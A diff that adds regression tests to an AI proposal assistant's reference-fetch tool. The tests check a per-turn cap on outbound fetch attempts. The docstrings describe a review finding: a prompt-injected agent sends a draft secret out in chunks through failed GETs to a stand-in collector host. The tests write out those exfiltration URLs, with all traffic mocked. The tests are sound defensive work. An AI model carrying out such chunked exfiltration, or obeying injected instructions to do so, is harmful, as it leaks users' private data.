@@ -19,6 +19,10 @@ from grant_lab.db.models import (
     Workspace,
 )
 from grant_lab.proposal_assist.port_impl import build_ports
+from grant_lab.proposal_assist.ports.accounting import (
+    MAX_FETCH_ATTEMPTS_PER_TURN,
+    MAX_FETCHES_PER_TURN,
+)
 from grant_lab.proposal_assist.references.embed import FakeEmbedder
 from grant_lab.proposal_assist.tools.references import fetch_reference_impl
 from grant_lab.proposal_assist.tools.registry import ToolContext, snapshot_invocation
@@ -383,3 +387,177 @@ async def test_fetch_reference_impl_passes_source_meta_and_citation_service(
     assert captured["citation_service"] is fake_service, (
         "citation_service must be ctx.citation_service"
     )
+
+
+# ---------------------------------------------------------------------------
+# M-PA-3 (review 2026-10-26, A5 STEP4) — failed fetches must count against a
+# per-turn OUTBOUND ATTEMPT cap, or the cap is not a cap.
+# ---------------------------------------------------------------------------
+
+#: The exfiltration collector of the review's probe. A ".example.com" host so
+#: tests/proposal_assist/conftest.py::fake_public_dns resolves it to a public IP
+#: and the SSRF guard lets it through; pytest-httpx answers it in-process, so
+#: nothing ever leaves this machine.
+_COLLECTOR_HOST = "collector.example.com"
+_COLLECTOR_RE = re.compile(r"https://collector\.example\.com/px\?.*")
+
+
+def _collector_attempts(httpx_mock):
+    """Every outbound request the fetcher actually made to the collector."""
+    return [r for r in httpx_mock.get_requests() if r.url.host == _COLLECTOR_HOST]
+
+
+@pytest.mark.asyncio
+async def test_failed_fetches_count_against_the_per_turn_attempt_cap(
+    pg_session_factory, tmp_path, httpx_mock
+):
+    """A5 STEP4: the per-turn cap is refunded on EVERY failure and HTTP 404 is a
+    failure, so a prompt-injected agent made 8 outbound GETs — one secret chunk
+    per query string — with turn_jobs.fetch_count still at 2. The cap looked
+    like it held and the whole draft secret left the box.
+
+    A second, IN-MEMORY per-turn counter must bound outbound ATTEMPTS at
+    cap + 2, failures included. The success counter keeps its refund semantics.
+    """
+    httpx_mock.add_response(url=_COLLECTOR_RE, status_code=404, is_reusable=True, is_optional=True)
+
+    # cap + 2, named in one place so the constant and this test cannot drift.
+    assert MAX_FETCH_ATTEMPTS_PER_TURN == MAX_FETCHES_PER_TURN + 2
+
+    secret = "S3CRET-DRAFT-BODY-DO-NOT-LEAK"
+    chunks = [secret[i : i + 4] for i in range(0, len(secret), 4)]
+    assert len(chunks) == 8, "the probe is 8 calls, one chunk each"
+
+    wsid, jobid = _seed_running_turn(pg_session_factory)
+    ctx = _make_ctx(pg_session_factory, tmp_path, wsid, active_turn_job_id=jobid)
+    ports = build_ports(pg_session_factory)
+
+    errors = []
+    for i, chunk in enumerate(chunks):
+        # Production snapshots a FRESH Invocation per tool call (_safe_tool ->
+        # snapshot_invocation), so a counter keyed on the Invocation OBJECT
+        # would reset mid-turn and reopen the channel. Mirror production.
+        invocation = snapshot_invocation(ctx)
+        out = await fetch_reference_impl(
+            ctx,
+            ports=ports,
+            invocation=invocation,
+            input=f"https://{_COLLECTOR_HOST}/px?s={chunk}",
+            embedder=FakeEmbedder(),
+        )
+        assert "error" in out, (i, out)
+        errors.append(out["error"])
+
+    attempts = _collector_attempts(httpx_mock)
+    assert len(attempts) == MAX_FETCHES_PER_TURN + 2, [str(r.url) for r in attempts]
+    # The refused tail never reached the network, and says why.
+    assert "attempt cap" in errors[-1].lower(), errors[-1]
+    # The channel is bounded: the secret cannot be reassembled from what left.
+    leaked = "".join(r.url.params["s"] for r in attempts)
+    assert secret not in leaked
+    assert leaked != secret
+
+    with pg_session_factory() as s:
+        job = s.scalar(select(TurnJob).where(TurnJob.id == jobid))
+    # The existing SUCCESS counter keeps its refund semantics, untouched.
+    assert job.fetch_count == 0
+
+
+@pytest.mark.asyncio
+async def test_fetch_attempt_budget_resets_on_the_next_turn(
+    pg_session_factory, tmp_path, httpx_mock
+):
+    """Being per TURN is the whole property. The interactive ToolContext is REUSED
+    across turns (set_turn_provenance restamps it), so a counter that survived a
+    turn boundary would throttle the next legitimate turn, and one that reset
+    mid-turn would reopen the channel. This pins the forward direction: a new
+    running turn job gets a fresh attempt budget."""
+    httpx_mock.add_response(url=_COLLECTOR_RE, status_code=404, is_reusable=True, is_optional=True)
+
+    wsid, job_a = _seed_running_turn(pg_session_factory)
+    ctx = _make_ctx(pg_session_factory, tmp_path, wsid, active_turn_job_id=job_a)
+    ports = build_ports(pg_session_factory)
+
+    # Burn the whole attempt budget of turn A, plus one refused call.
+    for i in range(MAX_FETCHES_PER_TURN + 3):
+        out = await fetch_reference_impl(
+            ctx,
+            ports=ports,
+            invocation=snapshot_invocation(ctx),
+            input=f"https://{_COLLECTOR_HOST}/px?s=a{i}",
+            embedder=FakeEmbedder(),
+        )
+        assert "error" in out, (i, out)
+    burned = len(_collector_attempts(httpx_mock))
+    assert burned == MAX_FETCHES_PER_TURN + 2
+
+    # Turn A finishes; turn B becomes the running turn (uq_turn_jobs_running
+    # admits only one). The controller restamps the retained ctx — exactly what
+    # set_turn_provenance does between turns.
+    with pg_session_factory() as s:
+        old = s.scalar(select(TurnJob).where(TurnJob.id == job_a))
+        old.status = "completed"
+        s.flush()
+        turn_b = ChatTurn(workspace_id=wsid, role="user", content="next")
+        s.add(turn_b)
+        s.flush()
+        job = TurnJob(
+            workspace_id=wsid,
+            user_turn_id=turn_b.id,
+            status="running",
+            started_at=datetime.now(UTC),
+            submitted_by_user_id=old.submitted_by_user_id,
+        )
+        s.add(job)
+        s.commit()
+        job_b = job.id
+    ctx.active_turn_job_id = job_b
+
+    out = await fetch_reference_impl(
+        ctx,
+        ports=ports,
+        invocation=snapshot_invocation(ctx),
+        input=f"https://{_COLLECTOR_HOST}/px?s=b0",
+        embedder=FakeEmbedder(),
+    )
+    assert "error" in out
+    assert "attempt cap" not in out["error"].lower(), out["error"]
+    # The new turn's first call DID go out: the budget reset at the boundary.
+    assert len(_collector_attempts(httpx_mock)) == burned + 1
+
+
+@pytest.mark.asyncio
+async def test_fetch_reference_refuses_html_before_extraction(
+    pg_session_factory, tmp_path, httpx_mock
+):
+    """M-PA-5: an ordinary web page was mis-sniffed as application/pdf, died in
+    PDF extraction, and spent a fetch slot on a useless error. It must be
+    refused BEFORE extraction, with a message that tells the member what to do,
+    and the slot must come back."""
+    httpx_mock.add_response(
+        url="https://example.com/call-for-proposals",
+        text="<!doctype html><html><body><h1>Call for proposals</h1></body></html>",
+        headers={"content-type": "text/html; charset=utf-8"},
+    )
+
+    wsid, jobid = _seed_running_turn(pg_session_factory)
+    ctx = _make_ctx(pg_session_factory, tmp_path, wsid, active_turn_job_id=jobid)
+    ports = build_ports(pg_session_factory)
+    out = await fetch_reference_impl(
+        ctx,
+        ports=ports,
+        invocation=snapshot_invocation(ctx),
+        input="https://example.com/call-for-proposals",
+        embedder=FakeEmbedder(),
+    )
+    assert "error" in out
+    assert "HTML pages aren't supported — upload a PDF or give a direct PDF link" in out["error"]
+    # Not a PDF-extraction failure: nothing was handed to an extractor.
+    assert "extraction failed" not in out["error"].lower()
+    assert "No /Root object" not in out["error"]
+
+    with pg_session_factory() as s:
+        job = s.scalar(select(TurnJob).where(TurnJob.id == jobid))
+        ref = s.scalar(select(Reference).where(Reference.workspace_id == wsid))
+    assert job.fetch_count == 0
+    assert ref is None
